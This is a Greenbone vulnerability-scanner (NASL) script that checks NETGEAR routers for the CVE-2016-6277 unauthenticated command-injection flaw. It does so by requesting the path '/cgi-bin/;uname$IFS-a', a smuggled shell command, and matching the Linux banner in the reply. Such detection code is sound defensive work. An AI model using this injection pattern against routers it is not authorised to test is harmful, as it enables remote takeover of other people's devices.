# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106463");
  script_version("2023-07-20T05:05:17+0000");
  script_xref(name:"CISA", value:"Known Exploited Vulnerability (KEV) catalog");
  script_xref(name:"URL", value:"https://www.cisa.gov/known-exploited-vulnerabilities-catalog");
  script_cve_id("CVE-2016-6277");
  script_tag(name:"last_modification", value:"2023-07-20 05:05:17 +0000 (Thu, 20 Jul 2023)");
  script_tag(name:"creation_date", value:"2016-12-12 11:02:51 +0700 (Mon, 12 Dec 2016)");
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2017-08-16 01:29:00 +0000 (Wed, 16 Aug 2017)");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("NETGEAR Routers RCE Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_netgear_nighthawk_router_detect.nasl");
  script_require_ports("Services/www", 8443);
  script_mandatory_keys("netgear_nighthawk/detected");

  script_tag(name:"summary", value:"Multiple Netgear routers are prone to a remote command execution
vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to execute an os command and checks the response.");

  script_tag(name:"impact", value:"An unauthenticated user can inject os commands.");

  script_tag(name:"affected", value:"Netgear Model R6250, R6400, R6700, R6900, R7000, R7100LG, R7300DST, R7900,
R8000, D6220 and D6400.");

  script_tag(name:"solution", value:"Update to the latest firmware according the vendor's advisory.");

  script_xref(name:"URL", value:"https://www.kb.cert.org/vuls/id/582384");
  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40889/");
  script_xref(name:"URL", value:"http://www.sj-vs.net/a-temporary-fix-for-cert-vu582384-cwe-77-on-netgear-r7000-and-r6400-routers/");
  script_xref(name:"URL", value:"http://kb.netgear.com/000036386/CVE-2016-582384");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default: 8443);

url = "/cgi-bin/;uname$IFS-a";

if (http_vuln_check(port: port, url: url, pattern: "Linux .* SMP PREEMPT.*armv7l unknown")) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(0);
